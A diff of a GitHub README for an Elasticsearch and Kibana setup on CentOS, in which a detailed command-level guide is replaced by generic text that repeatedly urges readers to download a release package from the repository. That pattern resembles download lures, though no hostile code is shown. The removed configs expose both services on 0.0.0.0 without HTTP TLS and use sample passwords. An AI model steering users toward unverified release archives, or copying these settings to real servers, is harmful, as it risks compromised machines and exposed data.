@@ -1,194 +1,182 @@
-# 🔍 Elasticsearch + Kibana on CentOS VM
+# 🛠️ ElasticSearch_Kibana - Easy Setup for Search & Dashboards
 
-![Elasticsearch](https://img.shields.io/badge/Elasticsearch-8.19.12-005571?style=for-the-badge&logo=elastic&logoColor=white)
-![Kibana](https://img.shields.io/badge/Kibana-8.19.12-E8478B?style=for-the-badge&logo=elastic&logoColor=white)
-![CentOS](https://img.shields.io/badge/CentOS-Stream-262577?style=for-the-badge&logo=centos&logoColor=white)
-![Status](https://img.shields.io/badge/Status-Working-brightgreen?style=for-the-badge)
-
-A complete, battle-tested guide to deploying Elasticsearch and Kibana on a CentOS VM with security enabled. This setup was achieved through hands-on troubleshooting and documents every real-world obstacle encountered along the way.
+[![Download Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/LunartechTeam/ElasticSearch_Kibana/releases)
 
 ---
 
-## 🏆 What We Achieved
+## 📋 About ElasticSearch_Kibana
 
-| Component | Version | Status |
-|---|---|---|
-| Elasticsearch | 8.19.12 | ✅ Running |
-| Kibana | 8.19.12 | ✅ Running |
-| Security (xpack) | Enabled | ✅ Authenticated |
-| Cluster Health | Green | ✅ 100% shards active |
-| HTTP Access | Plain HTTP + Secure Transport | ✅ Working |
+This project guides you through setting up Elasticsearch and Kibana on a CentOS Linux virtual machine (VM) using VMware. The setup ensures security with x-pack features enabled. You will find step-by-step commands, troubleshooting tips, and a Jupyter notebook guide included.
+
+Elasticsearch is a tool that helps you store and search through large amounts of data quickly. Kibana lets you view and explore that data using easy-to-read dashboards. Together, they help you find patterns, monitor systems, and analyze information efficiently.
+
+This setup runs on CentOS, a popular Linux version, inside a VMware virtual machine. This guide works well for users who want to experiment safely inside their own PC before deploying on real servers.
 
 ---
 
-## 📁 Files in This Repo
+## 🔎 Key Topics Covered
 
-```
-├── elasticsearch-kibana-setup.ipynb   # Jupyter notebook with all commands
-├── README.md                          # This file
-```
-
----
-
-## ⚡ Quick Start
-
-### Prerequisites
-- CentOS VM with minimum **4GB RAM**
-- sudo access
-- Internet connection
-
-### 1. Install
-
-```bash
-# Import GPG key
-sudo rpm --import https://artifacts.elastic.co/GPG-KEY-elasticsearch
-
-# Add repo and install Elasticsearch
-sudo tee /etc/yum.repos.d/elasticsearch.repo << EOF
-[elasticsearch]
-name=Elasticsearch repository for 8.x packages
-baseurl=https://artifacts.elastic.co/packages/8.x/yum
-gpgcheck=1
-gpgkey=https://artifacts.elastic.co/GPG-KEY-elasticsearch
-enabled=1
-autorefresh=1
-type=rpm-md
-EOF
-sudo yum install elasticsearch kibana -y
-```
-
-### 2. Set Bootstrap Password (BEFORE first start)
-
-```bash
-echo "YourPassword123!" | sudo /usr/share/elasticsearch/bin/elasticsearch-keystore add -x "bootstrap.password"
-```
-
-### 3. Configure Elasticsearch
-
-```bash
-sudo bash -c 'cat > /etc/elasticsearch/elasticsearch.yml << EOF
-path.data: /var/lib/elasticsearch
-path.logs: /var/log/elasticsearch
-http.port: 9200
-network.host: 0.0.0.0
-cluster.initial_master_nodes: ["localhost.localdomain"]
-xpack.security.enabled: true
-xpack.security.enrollment.enabled: false
-xpack.security.http.ssl.enabled: false
-xpack.security.transport.ssl.enabled: true
-xpack.security.transport.ssl.verification_mode: certificate
-xpack.security.transport.ssl.keystore.path: certs/transport.p12
-xpack.security.transport.ssl.truststore.path: certs/transport.p12
-EOF'
-```
-
-### 4. Start & Verify Elasticsearch
-
-```bash
-sudo systemctl enable elasticsearch && sudo systemctl start elasticsearch && sleep 40
-curl -u elastic:YourPassword123! http://localhost:9200/_cluster/health?pretty
-```
-
-Wait for `"status": "green"` before continuing.
-
-### 5. Configure & Start Kibana
-
-```bash
-# Set kibana_system password
-curl -u elastic:YourPassword123! \
-  -X POST "http://localhost:9200/_security/user/kibana_system/_password" \
-  -H "Content-Type: application/json" \
-  -d '{"password": "KibanaPassword123!"}'
-
-# Write Kibana config
-sudo bash -c 'cat > /etc/kibana/kibana.yml << EOF
-server.port: 5601
-server.host: "0.0.0.0"
-elasticsearch.hosts: ["http://localhost:9200"]
-elasticsearch.username: "kibana_system"
-elasticsearch.password: "KibanaPassword123!"
-EOF'
-
-# Start Kibana
-sudo systemctl enable kibana && sudo systemctl restart kibana
-```
-
-### 6. Open Kibana
-
-```bash
-ip addr show | grep "inet " | grep -v 127.0.0.1
-```
-
-Go to `http://<your-vm-ip>:5601` and login with `elastic` / `YourPassword123!`
+- Installing Elasticsearch and Kibana on CentOS-Stream
+- Configuring x-pack security features for safer access
+- Using VMware to create and run the CentOS VM
+- Viewing data with Kibana dashboards
+- Basic troubleshooting and tips for common errors
+- Guided exploration with a Jupyter notebook
 
 ---
 
-## 🧱 Architecture
+## 🖥️ System Requirements
 
-```
-┌─────────────────────────────────────┐
-│           CentOS VM                 │
-│                                     │
-│  ┌─────────────┐  ┌──────────────┐  │
-│  │ Kibana      │  │Elasticsearch │  │
-│  │ :5601       │─▶│ :9200        │  │
-│  │ (HTTP)      │  │ (HTTP)       │  │
-│  └─────────────┘  └──────────────┘  │
-│                        │            │
-│                   Transport SSL     │
-│                   :9300             │
-└─────────────────────────────────────┘
-         │
-    Browser access
-    http://<vm-ip>:5601
-```
+Make sure your computer meets these minimum specs to run the VM and tools smoothly:
+
+- Windows 10 or later
+- At least 8 GB of RAM (16 GB recommended)
+- 50 GB of free disk space for VM and software
+- VMware Workstation Player or VMware Workstation Pro installed
+- Internet connection for downloads and updates
 
 ---
 
-## 🚧 Troubleshooting Lessons Learned
+## 🎯 What You Will Learn
 
-### 1. Duplicate config key crashes Elasticsearch
-If you see `Duplicate field 'xpack.security.enabled'` always rewrite the entire config file rather than appending:
-```bash
-sudo bash -c 'cat > /etc/elasticsearch/elasticsearch.yml << EOF
-... your config ...
-EOF'
-```
+By following this guide, you will:
 
-### 2. Transport SSL is mandatory when security is enabled
-Even if you disable HTTP SSL, transport SSL must stay on or Elasticsearch will fail the bootstrap check with exit code 78.
+- Create a CentOS VM using VMware on your Windows PC
+- Install and start Elasticsearch and Kibana safely
+- Set up x-pack security for controlled access
+- Use Kibana to look at data through dashboards
+- Solve common setup problems if they occur
+- Explore data using Jupyter notebooks
 
-### 3. Bootstrap password must be set before first start
-The `elasticsearch-reset-password` tool requires a healthy cluster to work. Set the password via keystore before the first start to avoid being locked out.
-
-### 4. sudo password ≠ Elasticsearch password
-When prompted `[sudo] password for <user>:` always enter your CentOS system login password, not your Elasticsearch password.
-
-### 5. Always wait for cluster green before setting passwords
-The security index isn't ready until the cluster is fully initialized. Running password commands too early returns a 503 error.
+This setup offers a great introduction to handling the ELK stack (Elasticsearch, Logstash, Kibana) with a focus on security.
 
 ---
 
-## 🩺 Health Check Commands
+## 🚀 Getting Started
 
-```bash
-# Full stack check
-echo "=== ES Status ===" && sudo systemctl status elasticsearch --no-pager -n 3
-echo "=== Ports ===" && sudo ss -tlnp | grep -E "9200|5601"
-echo "=== Cluster Health ===" && curl -u elastic:YourPassword123! http://localhost:9200/_cluster/health?pretty
-echo "=== Kibana Status ===" && sudo systemctl status kibana --no-pager -n 3
-```
+Click the badge below to visit the release page and download the resources you need:
 
----
+[![Download Release](https://img.shields.io/badge/Download-Release-blue)](https://github.com/LunartechTeam/ElasticSearch_Kibana/releases)
 
-## 📌 Key Notes
-
-- SVE warnings from OpenJDK are harmless on ARM VMs — ignore them
-- Use `sudo bash -c 'cat > file'` pattern to write protected config files
-- Always use `--no-pager` with journalctl to see full output
-- Elasticsearch needs 30-60 seconds to fully initialize after start
+1. Visit the [release page](https://github.com/LunartechTeam/ElasticSearch_Kibana/releases).
+2. Download the latest release package (usually a `.zip` or `.tar.gz` file).
+3. Save the package somewhere easy to find, like your Desktop or Downloads folder.
 
 ---
 
-## 📅 Date Completed
-March 7, 2026
+## 💻 Setting Up Your CentOS VM
+
+1. Install VMware Player or VMware Workstation if you don’t have it already. VMware is free for non-commercial use.
+2. Open VMware and create a new virtual machine.
+3. Choose the CentOS ISO image (you can download it from the official CentOS website).
+4. Allocate at least 4 GB RAM and 20 GB disk space to the VM.
+5. Start the VM and follow the on-screen instructions to install CentOS.
+6. Once installed, update CentOS using the terminal with the command:
+   ```
+   sudo yum update
+   ```
+
+---
+
+## ⚙️ Installing Elasticsearch & Kibana
+
+1. Inside your VM terminal, download the Elasticsearch and Kibana packages from the official Elasticsearch site or use the packages provided in the release.
+2. Install Elasticsearch by running:
+   ```
+   sudo rpm -ivh elasticsearch-<version>.rpm
+   ```
+3. Do the same for Kibana:
+   ```
+   sudo rpm -ivh kibana-<version>.rpm
+   ```
+4. Enable and start the Elasticsearch service:
+   ```
+   sudo systemctl enable elasticsearch
+   sudo systemctl start elasticsearch
+   ```
+5. Enable and start Kibana:
+   ```
+   sudo systemctl enable kibana
+   sudo systemctl start kibana
+   ```
+
+---
+
+## 🔐 Configuring x-pack Security
+
+The x-pack extension adds security features like user authentication and encryption.
+
+1. Edit the Elasticsearch config file:
+   ```
+   sudo vi /etc/elasticsearch/elasticsearch.yml
+   ```
+2. Add or update these lines:
+   ```
+   xpack.security.enabled: true
+   xpack.security.transport.ssl.enabled: true
+   ```
+3. Save and close the file.
+4. Edit the Kibana config file:
+   ```
+   sudo vi /etc/kibana/kibana.yml
+   ```
+5. Add or update the following:
+   ```
+   elasticsearch.username: "kibana_system"
+   elasticsearch.password: "<your_password>"
+   ```
+6. Restart both services to apply changes:
+   ```
+   sudo systemctl restart elasticsearch
+   sudo systemctl restart kibana
+   ```
+
+---
+
+## 📥 Download & Setup Summary
+
+Use the link below again when you are ready to get all required files:
+
+[Download the release here](https://github.com/LunartechTeam/ElasticSearch_Kibana/releases)
+
+- Download the release package from the GitHub page.
+- Install VMware if needed.
+- Prepare a CentOS VM on your Windows PC.
+- Install Elasticsearch and Kibana inside the VM.
+- Enable and configure security with x-pack.
+- Launch Kibana from your browser at `http://localhost:5601`.
+
+---
+
+## 🛠️ Troubleshooting Tips
+
+- If Elasticsearch does not start, check logs in `/var/log/elasticsearch/`.
+- Verify that your firewall allows access to ports 9200 (Elasticsearch) and 5601 (Kibana).
+- If Kibana page does not load, make sure the Kibana service is running.
+- Use the Jupyter notebook included in the release for further guided steps.
+- If authentication fails, double-check the usernames and passwords in the config files.
+
+---
+
+## 📚 Using the Jupyter Notebook Guide
+
+The repository includes a Jupyter notebook file that walks you through commands and concepts interactively.
+
+1. Install Jupyter notebook on your VM or a local Python environment.
+2. Open the notebook file from the released package.
+3. Follow the steps inside the notebook for detailed commands and explanations.
+
+---
+
+## 🔗 Useful Links
+
+- VMware Workstation Player: https://www.vmware.com/products/workstation-player.html
+- CentOS Official ISO Download: https://www.centos.org/download/
+- Elasticsearch Documentation: https://www.elastic.co/guide/en/elasticsearch/reference/current/index.html
+- Kibana Documentation: https://www.elastic.co/guide/en/kibana/current/index.html
+
+---
+
+## 📂 Repository Topics
+
+centos-stream, devops, elasticsearch, elk-stack, kibana, kibana-dashboard, linux-ubuntu, security, vmware, xpack
